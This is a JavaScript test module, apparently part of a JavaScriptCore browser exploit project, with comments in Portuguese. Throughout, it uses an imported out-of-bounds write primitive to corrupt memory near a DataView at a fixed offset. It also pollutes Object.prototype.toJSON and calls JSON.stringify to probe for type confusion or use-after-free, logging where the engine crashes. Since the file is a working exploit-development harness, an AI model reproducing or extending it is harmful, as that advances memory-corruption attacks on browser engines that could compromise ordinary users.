// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const CRITICAL_PARAMS_FOR_ITERATIVE_TEST = {
    object_to_stringify_data: { data: "test_data_for_iterative_json" }, // Usaremos um objeto simples
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    value_to_write: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKey: 'toJSON',
};

// Contador global de chamadas para a toJSON atual em teste
export let current_toJSON_call_count = 0;

export async function executeTestWithSpecificToJSON(
    testDescription,
    toJSONFunctionToUse // A variante da função toJSON a ser testada
) {
    const FNAME = `executeTestWithSpecificToJSON<${testDescription}>`; 
    logS3(`--- Iniciando Teste com toJSON Variante: ${testDescription} ---`, "test", FNAME);
    document.title = `Iniciando: ${testDescription}`;

    current_toJSON_call_count = 0; // Resetar para cada variante
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup.", "error", FNAME); 
        document.title = "ERRO OOB Setup - " + FNAME;
        return;
    }
    document.title = "OOB OK - " + FNAME;

    let object_to_stringify = JSON.parse(JSON.stringify(CRITICAL_PARAMS_FOR_ITERATIVE_TEST.object_to_stringify_data)); // Cópia limpa
    logS3(`object_to_stringify recriado: ${JSON.stringify(object_to_stringify)}`, "info", FNAME);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, CRITICAL_PARAMS_FOR_ITERATIVE_TEST.ppKey);
    let pollutionApplied = false;
    let stepReached = "antes_pp";
    let potentiallyCrashed = true;

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${CRITICAL_PARAMS_FOR_ITERATIVE_TEST.ppKey} com ${testDescription}...`, "info", FNAME);
        document.title = `Aplicando PP (${testDescription})`;
        Object.defineProperty(Object.prototype, CRITICAL_PARAMS_FOR_ITERATIVE_TEST.ppKey, {
            value: toJSONFunctionToUse,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada com ${testDescription}.`, "good", FNAME);
        stepReached = "pp_aplicada";
        document.title = `PP OK (${testDescription})`;

        stepReached = "antes_escrita_oob";
        logS3(`CORRUPÇÃO: ${toHex(CRITICAL_PARAMS_FOR_ITERATIVE_TEST.value_to_write)} @ ${toHex(CRITICAL_PARAMS_FOR_ITERATIVE_TEST.corruption_offset)}`, "warn", FNAME);
        document.title = `Antes OOB Write (${testDescription})`;
        oob_write_absolute(CRITICAL_PARAMS_FOR_ITERATIVE_TEST.corruption_offset, CRITICAL_PARAMS_FOR_ITERATIVE_TEST.value_to_write, CRITICAL_PARAMS_FOR_ITERATIVE_TEST.bytes_to_write_for_corruption);
        logS3("Escrita OOB feita.", "info", FNAME);
        stepReached = "apos_escrita_oob";
        document.title = `Após OOB Write (${testDescription})`;

        await PAUSE_S3(SHORT_PAUSE_S3);

        stepReached = "antes_stringify";
        document.title = `Antes Stringify (${testDescription})`;
        logS3(`Chamando JSON.stringify para object_to_stringify (com ${testDescription})...`, "info", FNAME);
        let stringifyResult = null;
        try {
            stringifyResult = JSON.stringify(object_to_stringify); 
            stepReached = `apos_stringify`;
            potentiallyCrashed = false; 
            document.title = `Strfy OK (${testDescription})`;
            logS3(`Resultado JSON.stringify: ${String(stringifyResult).substring(0, 100)}... (Chamadas toJSON: ${current_toJSON_call_count})`, "info", FNAME);
        } catch (e) {
            stepReached = `erro_stringify`;
            potentiallyCrashed = false; 
            document.title = `ERRO Strfy (${testDescription})`;
            logS3(`ERRO JSON.stringify: ${e.name} - ${e.message}. (Chamadas toJSON: ${current_toJSON_call_count})`, "critical", FNAME);
            console.error(`JSON.stringify ERROR (${testDescription}):`, e);
        }
    } catch (mainError) {
        potentiallyCrashed = false; 
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME);
        document.title = `ERRO Principal (${testDescription})`;
        console.error(`Main test error (${testDescription}):`, mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, CRITICAL_PARAMS_FOR_ITERATIVE_TEST.ppKey, originalToJSONDescriptor);
            else delete Object.prototype[CRITICAL_PARAMS_FOR_ITERATIVE_TEST.ppKey];
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}`, "info", FNAME);
        if (potentiallyCrashed) {
             document.title = `CONGELOU? ${stepReached} (${testDescription})`;
             logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}. Chamadas toJSON: ${current_toJSON_call_count}`, "error", FNAME);
        }
    }
    logS3(`--- Teste com toJSON Variante Concluído: ${testDescription} (Chamadas toJSON: ${current_toJSON_call_count}) ---`, "test", FNAME);
}
